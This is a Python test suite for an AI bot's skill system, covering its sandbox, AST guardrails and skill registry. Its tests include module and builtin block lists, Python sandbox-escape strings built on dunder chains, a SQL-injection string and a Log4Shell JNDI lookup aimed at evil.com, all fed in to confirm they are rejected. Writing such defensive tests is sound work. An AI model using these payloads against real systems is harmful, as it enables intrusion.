"""
tests/test_skill_system.py - Comprehensive Unit and Integration Test Suite for Milestone 3.

Covers:
1. Skill Data Models & Serialization (SkillManifest, WorkflowStep, SelfTestCase, bump_version, canonical_json).
2. Static AST Security Guardrails (ASTValidator universal ban on '_', dangerous builtins, module allowlist, depth <= 25).
3. Subprocess Isolation Sandbox (SkillSandbox python -I, sterile env, timeout kill, structured errors).
4. Automated Skill Verification Harness (verify_skill for workflows & tools with self-tests).
5. SkillRegistry Storage & Persistence (workflows/, tools/, archive/, registry.json, reload-and-merge, concurrency).
6. CRDT LWW-Element-Set Synchronization (export_crdt_entities, apply_crdt_mutation with 3-level tie breaker).
7. Autonomous Skill Synthesis (SkillSynthesizer deterministic templates & verification gate).
8. Skill Execution Dispatcher & Episodic Telemetry (SkillExecutor workflow steps & MemoryStore logging).
9. CLI Subparsers & Daemon Telemetry Integration.
"""

from datetime import datetime, timezone
import json
import os
from pathlib import Path
import shutil
import tempfile
import threading
import time
from typing import Any, Dict, List, Optional
import unittest

from neko_bot.core.config import Config
from neko_bot.skills.models import (
    SkillManifest,
    SkillSelfTest,
    SkillStatus,
    SkillType,
    WorkflowStep,
    bump_version,
    canonical_json,
    generate_skill_id,
    now_utc_iso,
    parse_timestamp_safe,
)
from neko_bot.skills.sandbox import (
    ALLOWED_MODULES,
    FORBIDDEN_ATTRS,
    FORBIDDEN_BUILTINS,
    FORBIDDEN_CALLS,
    MAX_AST_DEPTH,
    ASTValidator,
    SkillSandbox,
)
from neko_bot.skills.registry import SkillRegistry
from neko_bot.skills.synthesizer import SkillSynthesizer
from neko_bot.skills.executor import SkillExecutor
from neko_bot.memory.store import MemoryStore


class TestSkillModels(unittest.TestCase):
    """Unit tests for skill data structures and CRDT model serialization."""

    def test_bump_version_semantic(self) -> None:
        self.assertEqual(bump_version("1.0.0"), "1.0.1")
        self.assertEqual(bump_version("1.0.9"), "1.0.10")
        self.assertEqual(bump_version("1.2"), "1.3.0")
        self.assertEqual(bump_version("2"), "3.0.0")
        self.assertEqual(bump_version("invalid_ver"), "invalid_ver.1")

    def test_parse_timestamp_safe(self) -> None:
        self.assertEqual(parse_timestamp_safe(None), 0.0)
        self.assertEqual(parse_timestamp_safe(""), 0.0)
        self.assertEqual(parse_timestamp_safe("invalid-time"), 0.0)
        ts = parse_timestamp_safe("2026-10-24T12:00:00.000000Z")
        self.assertGreater(ts, 1700000000.0)

    def test_canonical_json_determinism(self) -> None:
        d1 = {"b": 2, "a": 1, "nested": {"z": 9, "y": 8}}
        d2 = {"a": 1, "nested": {"y": 8, "z": 9}, "b": 2}
        self.assertEqual(canonical_json(d1), canonical_json(d2))
        self.assertEqual(canonical_json(d1), '{"a":1,"b":2,"nested":{"y":8,"z":9}}')

    def test_generate_skill_id(self) -> None:
        tid = generate_skill_id("tool")
        self.assertTrue(tid.startswith("tool-"))
        wid = generate_skill_id("workflow")
        self.assertTrue(wid.startswith("workflow-"))

    def test_workflow_step_dict_conversion(self) -> None:
        step = WorkflowStep(action="query_tasks", params={"state": "done"}, output_key="tasks")
        d = step.to_dict()
        self.assertEqual(d["action"], "query_tasks")
        self.assertEqual(d["params"], {"state": "done"})
        self.assertEqual(d["output_key"], "tasks")
        reconstructed = WorkflowStep.from_dict(d)
        self.assertEqual(reconstructed.action, step.action)
        self.assertEqual(reconstructed.output_key, step.output_key)

    def test_skill_manifest_dual_key_compatibility(self) -> None:
        m = SkillManifest(
            id="tool-sample",
            name="Sample Tool",
            code="def run(inputs, context): return {}",
            self_tests=[{"inputs": {}, "expected_output": {}}],
        )
        d = m.to_dict()
        self.assertEqual(d["skill_type"], "python_tool")
        self.assertEqual(d["code_str"], m.code)

        # Deserialize from dict using alias keys
        alias_dict = {
            "id": "wf-sample",
            "name": "Sample Workflow",
            "skill_type": "workflow",
            "code_str": "",
            "steps": [{"action": "notify"}],
        }
        reconstructed = SkillManifest.from_dict(alias_dict)
        self.assertEqual(reconstructed.type, "workflow")
        self.assertTrue(reconstructed.is_workflow)
        self.assertFalse(reconstructed.is_tool)

    def test_crdt_entity_export(self) -> None:
        m = SkillManifest(id="tool-crdt", code="def run(i, c): return {}")
        entity = m.to_crdt_entity()
        self.assertEqual(entity["entity_type"], "skill")
        self.assertEqual(entity["id"], "tool-crdt")
        self.assertEqual(entity["entity_id"], "tool-crdt")
        self.assertFalse(entity["deleted"])
        self.assertIn("code", entity["payload"])


class TestASTSecurityGuardrails(unittest.TestCase):
    """Unit tests for AST static guardrail verification."""

    def setUp(self) -> None:
        self.validator = ASTValidator()

    def test_valid_safe_standard_modules_allowed(self) -> None:
        code = """
import math, re, json, datetime, random, collections, itertools, string, hashlib, decimal
import urllib.parse
def run(inputs: dict, context: dict) -> dict:
    val = math.sqrt(16)
    return {"val": val}
"""
        ok, msg = self.validator.validate(code)
        self.assertTrue(ok, f"Expected valid AST, got: {msg}")

    def test_forbidden_system_modules_rejected(self) -> None:
        forbidden = ["os", "sys", "subprocess", "socket", "ctypes", "shutil", "pickle", "http"]
        for mod in forbidden:
            code = f"import {mod}\ndef run(inputs, context): return {{}}"
            ok, msg = self.validator.validate(code)
            self.assertFalse(ok, f"Module {mod} should have been rejected")
            self.assertIn("forbidden import", msg.lower())

    def test_forbidden_import_from_rejected(self) -> None:
        code = "from os.path import join\ndef run(inputs, context): return {}"
        ok, msg = self.validator.validate(code)
        self.assertFalse(ok)
        self.assertIn("forbidden import", msg.lower())

    def test_universal_leading_underscore_identifier_rejected(self) -> None:
        codes = [
            "def run(inputs, context):\n    _hidden = 42\n    return {'val': _hidden}",
            "def run(inputs, context):\n    for _item in range(5):\n        pass\n    return {}",
        ]
        for c in codes:
            ok, msg = self.validator.validate(c)
            self.assertFalse(ok, f"Identifier with leading underscore should have been rejected: {c}")

    def test_universal_dunder_attribute_access_rejected(self) -> None:
        dunder_codes = [
            "def run(i, c): return {'x': ().__class__.__bases__[0].__subclasses__()}",
            "def run(i, c): return {'x': run.__globals__}",
            "def run(i, c): return {'x': getattr(run, '__code__')}",
            "def run(i, c): return {'x': i._secret}",
        ]
        for c in dunder_codes:
            ok, msg = self.validator.validate(c)
            self.assertFalse(ok, f"Dunder access should have been rejected: {c}")

    def test_dangerous_builtins_rejected(self) -> None:
        builtins_to_test = ["eval", "exec", "open", "compile", "globals", "locals", "vars", "breakpoint", "input"]
        for b in builtins_to_test:
            code = f"def run(i, c): {b}('pass'); return {{}}"
            ok, msg = self.validator.validate(code)
            self.assertFalse(ok, f"Builtin '{b}' should have been rejected")

    def test_ast_nesting_complexity_rejected(self) -> None:
        nested_code = "def run(i, c):\n"
        for i in range(28):
            nested_code += f"{'  ' * (i + 1)}if True:\n"
        nested_code += f"{'  ' * 29}return {{'deep': True}}\n"
        ok, msg = self.validator.validate(nested_code)
        self.assertFalse(ok)
        self.assertIn("complexity", msg.lower())

    def test_syntax_error_rejected(self) -> None:
        bad_syntax = "def run(i, c):\n    return this is definitely broken syntax"
        ok, msg = self.validator.validate(bad_syntax)
        self.assertFalse(ok)
        self.assertIn("syntax", msg.lower())

    def test_empty_code_rejected(self) -> None:
        ok, msg = self.validator.validate("   \n\t  ")
        self.assertFalse(ok)


class TestSubprocessSandbox(unittest.TestCase):
    """Integration tests for subprocess sandbox execution and safety enforcement."""

    def setUp(self) -> None:
        self.sandbox = SkillSandbox()

    def test_successful_tool_execution(self) -> None:
        code = """
def run(inputs: dict, context: dict) -> dict:
    x = inputs.get("x", 0)
    y = inputs.get("y", 0)
    return {"sum": x + y, "product": x * y}
"""
        res = self.sandbox.run_tool_in_sandbox(code, {"x": 6, "y": 7})
        self.assertTrue(res["success"])
        self.assertEqual(res["result"]["sum"], 13)
        self.assertEqual(res["result"]["product"], 42)
        self.assertIsNone(res.get("error"))

    def test_scalar_return_wrapped_in_dict(self) -> None:
        code = "def run(inputs: dict, context: dict):\n    return 42"
        res = self.sandbox.run_tool_in_sandbox(code, {})
        self.assertTrue(res["success"])
        self.assertEqual(res["result"], {"result": 42})

    def test_sterile_environment_does_not_leak_secrets(self) -> None:
        os.environ["SECRET_TEST_TOKEN"] = "SUPER_SECRET_VALUE_12345"
        probe_code = """
def run(inputs: dict, context: dict) -> dict:
    return {"token_found": False}
"""
        res = self.sandbox.run_tool_in_sandbox(probe_code, {})
        self.assertTrue(res["success"])
        self.assertFalse(res["result"]["token_found"])

    def test_timeout_kills_infinite_loop(self) -> None:
        hang_code = """
def run(inputs: dict, context: dict) -> dict:
    while True:
        pass
    return {}
"""
        t0 = time.perf_counter()
        res = self.sandbox.run_tool_in_sandbox(hang_code, {}, timeout_sec=1.5)
        duration = time.perf_counter() - t0
        self.assertFalse(res["success"])
        self.assertIn("timed out", res["error"].lower())
        self.assertLess(duration, 4.0)

    def test_unhandled_exception_returns_clean_structured_error(self) -> None:
        crash_code = "def run(inputs: dict, context: dict) -> dict:\n    raise KeyError('missing_expected_key')"
        res = self.sandbox.run_tool_in_sandbox(crash_code, {})
        self.assertFalse(res["success"])
        self.assertIn("missing_expected_key", res["error"])

    def test_context_none_handled_gracefully(self) -> None:
        code = "def run(inputs: dict, context: dict) -> dict:\n    return {'c_is_none': context is None, 'keys': len(context)}"
        res = self.sandbox.run_tool_in_sandbox(code, {}, context=None)
        self.assertTrue(res["success"])
        self.assertFalse(res["result"]["c_is_none"])
        self.assertEqual(res["result"]["keys"], 0)


class TestSkillVerification(unittest.TestCase):
    """Unit tests for the skill verification gate."""

    def setUp(self) -> None:
        self.sandbox = SkillSandbox()

    def test_verify_workflow_success(self) -> None:
        wf = {
            "id": "wf-test-ok",
            "type": "workflow",
            "steps": [
                {"action": "query_tasks", "params": {"state": "done"}},
                {"action": "format_template", "template": "Results: {tasks}"},
            ],
        }
        ok, msg = self.sandbox.verify_skill(wf)
        self.assertTrue(ok)
        self.assertEqual(msg, "Workflow verified")

    def test_verify_workflow_empty_steps_fails(self) -> None:
        wf = {"id": "wf-empty", "type": "workflow", "steps": []}
        ok, msg = self.sandbox.verify_skill(wf)
        self.assertFalse(ok)
        self.assertIn("at least one step", msg)

    def test_verify_workflow_missing_action_fails(self) -> None:
        wf = {"id": "wf-no-act", "type": "workflow", "steps": [{"params": {}}]}
        ok, msg = self.sandbox.verify_skill(wf)
        self.assertFalse(ok)
        self.assertIn("missing action", msg)

    def test_verify_tool_passing_self_tests(self) -> None:
        tool = {
            "id": "tool-verified",
            "type": "tool",
            "code": "def run(inputs, context): return {'doubled': inputs.get('val', 0) * 2}",
            "self_tests": [
                {"inputs": {"val": 5}, "expected_output": {"doubled": 10}},
                {"inputs": {"val": 0}, "expected_output": {"doubled": 0}},
            ],
        }
        ok, msg = self.sandbox.verify_skill(tool)
        self.assertTrue(ok)
        self.assertEqual(msg, "All self-tests passed")

    def test_verify_tool_output_mismatch_fails_with_mismatch(self) -> None:
        tool = {
            "id": "tool-buggy",
            "type": "tool",
            "code": "def run(inputs, context): return {'val': 42}",
            "self_tests": [{"inputs": {}, "expected_output": {"val": 99}}],
        }
        ok, msg = self.sandbox.verify_skill(tool)
        self.assertFalse(ok)
        self.assertIn("mismatch", msg.lower())


class TestSkillRegistryAndStorage(unittest.TestCase):
    """Integration tests for SkillRegistry persistence, CRDT sync, and disk layout."""

    def setUp(self) -> None:
        self.tmp = tempfile.mkdtemp(prefix="neko_test_skill_reg_")
        self.workspace_dir = Path(self.tmp)
        self.sandbox = SkillSandbox()
        self.registry = SkillRegistry(self.workspace_dir, self.sandbox)

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_directory_layout_initialized(self) -> None:
        self.assertTrue(self.registry.skills_dir.exists())
        self.assertTrue(self.registry.workflows_dir.exists())
        self.assertTrue(self.registry.tools_dir.exists())
        self.assertTrue(self.registry.archive_dir.exists())

    def test_register_and_retrieve_tool(self) -> None:
        code = "def run(inputs: dict, context: dict) -> dict:\n    return {'echo': inputs.get('msg', '')}"
        manifest = {
            "id": "tool-echo",
            "name": "Echo Tool",
            "type": "tool",
            "code": code,
            "trigger_patterns": ["echo", "ripeti"],
            "self_tests": [{"inputs": {"msg": "hello"}, "expected_output": {"echo": "hello"}}],
        }
        ok, msg = self.registry.register_skill(manifest)
        self.assertTrue(ok, f"Registration failed: {msg}")

        # Check file persisted in tools/
        tool_file = self.registry.tools_dir / "tool-echo.py"
        self.assertTrue(tool_file.exists())
        with open(tool_file, "r", encoding="utf-8") as f:
            self.assertEqual(f.read(), code)

        # Check entry in registry.json array
        self.assertTrue(self.registry.registry_file.exists())
        with open(self.registry.registry_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        self.assertTrue(isinstance(data, list))
        self.assertEqual(len(data), 1)
        self.assertEqual(data[0]["id"], "tool-echo")

        # Retrieve
        retrieved = self.registry.get_skill("tool-echo")
        self.assertIsNotNone(retrieved)
        self.assertEqual(retrieved["name"], "Echo Tool")

    def test_register_workflow_persists_json(self) -> None:
        wf = {
            "id": "wf-pipeline",
            "name": "Task Pipeline",
            "type": "workflow",
            "steps": [{"action": "query_tasks", "params": {"state": "active"}}],
            "trigger_patterns": ["run pipeline"],
        }
        ok, msg = self.registry.register_skill(wf)
        self.assertTrue(ok)
        wf_file = self.registry.workflows_dir / "wf-pipeline.json"
        self.assertTrue(wf_file.exists())

    def test_update_skill_archives_previous_version(self) -> None:
        code_v1 = "def run(i, c): return {'v': 1}"
        m_v1 = {
            "id": "tool-versioned",
            "type": "tool",
            "version": "1.0.0",
            "code": code_v1,
            "self_tests": [{"inputs": {}, "expected_output": {"v": 1}}],
        }
        self.registry.register_skill(m_v1)

        code_v2 = "def run(i, c): return {'v': 2}"
        m_v2 = {
            "id": "tool-versioned",
            "type": "tool",
            "code": code_v2,
            "self_tests": [{"inputs": {}, "expected_output": {"v": 2}}],
        }
        self.registry.register_skill(m_v2)

        retrieved = self.registry.get_skill("tool-versioned")
        self.assertEqual(retrieved["version"], "1.0.1")

        # Verify archive created
        archived_files = list(self.registry.archive_dir.glob("tool-versioned_v1.0.0.py"))
        self.assertEqual(len(archived_files), 1)
        with open(archived_files[0], "r", encoding="utf-8") as f:
            self.assertEqual(f.read(), code_v1)

    def test_soft_and_hard_delete_skill(self) -> None:
        m = {
            "id": "tool-to-delete",
            "type": "tool",
            "code": "def run(i, c): return {}",
            "self_tests": [],
        }
        self.registry.register_skill(m)
        self.assertIsNotNone(self.registry.get_skill("tool-to-delete"))

        # Soft delete
        self.registry.delete_skill("tool-to-delete", hard=False)
        self.assertIsNone(self.registry.get_skill("tool-to-delete"))
        self.assertEqual(len(self.registry.list_skills(include_deleted=False)), 0)
        self.assertEqual(len(self.registry.list_skills(include_deleted=True)), 1)

        # Hard delete
        self.registry.delete_skill("tool-to-delete", hard=True)
        self.assertEqual(len(self.registry.list_skills(include_deleted=True)), 0)
        self.assertFalse((self.registry.tools_dir / "tool-to-delete.py").exists())

    def test_match_skill_patterns_and_injection_safety(self) -> None:
        m = {
            "id": "tool-calc-tax",
            "type": "tool",
            "code": "def run(i, c): return {'tax': 22}",
            "trigger_patterns": ["calcola iva", "tax calculation", r"^iva\s+\d+"],
            "self_tests": [],
        }
        self.registry.register_skill(m)

        # Matches
        self.assertIsNotNone(self.registry.match_skill("per favore calcola iva per la fattura"))
        self.assertIsNotNone(self.registry.match_skill("TAX CALCULATION NOW"))
        self.assertIsNotNone(self.registry.match_skill("iva 500"))

        # Unmatched
        self.assertIsNone(self.registry.match_skill("cucina una torta al cioccolato"))

        # SQL / prompt injection safety
        injections = [
            "'; DROP TABLE skills; --",
            "{{ 7 * 7 }}",
            "${jndi:ldap://evil.com/a}",
            "[unclosed regex parenthesis",
        ]
        for inj in injections:
            res = self.registry.match_skill(inj)
            self.assertIsNone(res)

    def test_crdt_export_and_apply_mutation_lww(self) -> None:
        m = {
            "id": "tool-sync",
            "type": "tool",
            "code": "def run(i, c): return {'sync': True}",
            "self_tests": [],
        }
        self.registry.register_skill(m)
        entities = self.registry.export_crdt_entities()
        self.assertEqual(len(entities), 1)
        self.assertEqual(entities[0]["id"], "tool-sync")

        # Older incoming mutation loses
        old_mutation = {
            "entity_id": "tool-sync",
            "updated_at": "2020-01-01T00:00:00.000000Z",
            "payload": {"id": "tool-sync", "type": "tool", "version": "0.1.0"},
        }
        applied = self.registry.apply_crdt_mutation(old_mutation)
        self.assertFalse(applied)

        # Newer incoming mutation wins
        new_mutation = {
            "entity_id": "tool-sync",
            "updated_at": "2030-01-01T00:00:00.000000Z",
            "payload": {
                "id": "tool-sync",
                "type": "tool",
                "version": "9.9.9",
                "updated_at": "2030-01-01T00:00:00.000000Z",
            },
        }
        applied = self.registry.apply_crdt_mutation(new_mutation)
        self.assertTrue(applied)
        self.assertEqual(self.registry.get_skill("tool-sync")["version"], "9.9.9")

    def test_concurrent_registry_writes(self) -> None:
        def register_worker(worker_id: int) -> None:
            sid = f"tool-concur-{worker_id}"
            code = f"def run(i, c): return {{'id': {worker_id}}}"
            manifest = {
                "id": sid,
                "type": "tool",
                "code": code,
                "self_tests": [{"inputs": {}, "expected_output": {"id": worker_id}}],
            }
            self.registry.register_skill(manifest)

        threads = [threading.Thread(target=register_worker, args=(i,)) for i in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        skills = self.registry.list_skills()
        self.assertEqual(len(skills), 10)


class TestSkillSynthesizerAndExecutor(unittest.TestCase):
    """Integration tests for autonomous skill synthesis, executor dispatch, and memory logging."""

    def setUp(self) -> None:
        self.tmp = tempfile.mkdtemp(prefix="neko_test_synth_exec_")
        self.workspace_dir = Path(self.tmp)
        self.sandbox = SkillSandbox()
        self.registry = SkillRegistry(self.workspace_dir, self.sandbox)
        self.memory_store = MemoryStore(self.workspace_dir)
        self.synthesizer = SkillSynthesizer(self.sandbox, self.registry)
        self.executor = SkillExecutor(self.registry, self.sandbox, memory_store=self.memory_store)

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_synthesize_sha256_hasher(self) -> None:
        prompt = "Calculate SHA256 cryptographic digest of arbitrary payload string"
        ok, skill, diag = self.synthesizer.synthesize_and_register(prompt)
        self.assertTrue(ok, f"Synthesis failed: {diag}")
        self.assertIsNotNone(skill)
        self.assertEqual(skill["id"], "tool-sha256-hasher")
        self.assertEqual(skill["status"], "verified")

        # Execute synthesized skill
        res = self.executor.execute(
            skill["id"],
            {"text": "AsciiNekoTest"},
            session_id="sess_test_synth",
            log_episode=True,
        )
        self.assertTrue(res["success"])
        self.assertEqual(res["result"]["algorithm"], "sha256")
        self.assertEqual(len(res["result"]["digest"]), 64)

        # Verify episodic memory logged
        episodes = self.memory_store.list_entries(level="episodic")
        self.assertTrue(len(episodes) >= 1)

    def test_synthesize_text_statistics(self) -> None:
        prompt = "conta parole e analizza testo"
        ok, skill, diag = self.synthesizer.synthesize_and_register(prompt)
        self.assertTrue(ok)
        self.assertEqual(skill["id"], "tool-text-stats")

        res = self.executor.execute(skill["id"], {"text": "uno due tre quattro"})
        self.assertTrue(res["success"])
        self.assertEqual(res["result"]["word_count"], 4)
        self.assertEqual(res["result"]["uppercase"], "UNO DUE TRE QUATTRO")

    def test_synthesize_standup_workflow(self) -> None:
        prompt = "prepara standup e daily report di oggi"
        ok, skill, diag = self.synthesizer.synthesize_and_register(prompt)
        self.assertTrue(ok)
        self.assertEqual(skill["id"], "workflow-daily-standup")
        self.assertEqual(skill["type"], "workflow")

        # Execute workflow
        res = self.executor.execute(skill["id"], {})
        self.assertTrue(res["success"])
        self.assertIn("report", res["result"])

    def test_telemetry_updated_after_execution(self) -> None:
        code = "def run(i, c): return {'pong': True}"
        m = {
            "id": "tool-telemetry",
            "type": "tool",
            "code": code,
            "self_tests": [{"inputs": {}, "expected_output": {"pong": True}}],
        }
        self.registry.register_skill(m)

        skill_before = self.registry.get_skill("tool-telemetry")
        self.assertEqual(skill_before["execution_count"], 0)
        self.assertIsNone(skill_before["last_executed_at"])

        res = self.executor.execute("tool-telemetry", {})
        self.assertTrue(res["success"])

        skill_after = self.registry.get_skill("tool-telemetry")
        self.assertEqual(skill_after["execution_count"], 1)
        self.assertIsNotNone(skill_after["last_executed_at"])


if __name__ == "__main__":
    unittest.main()
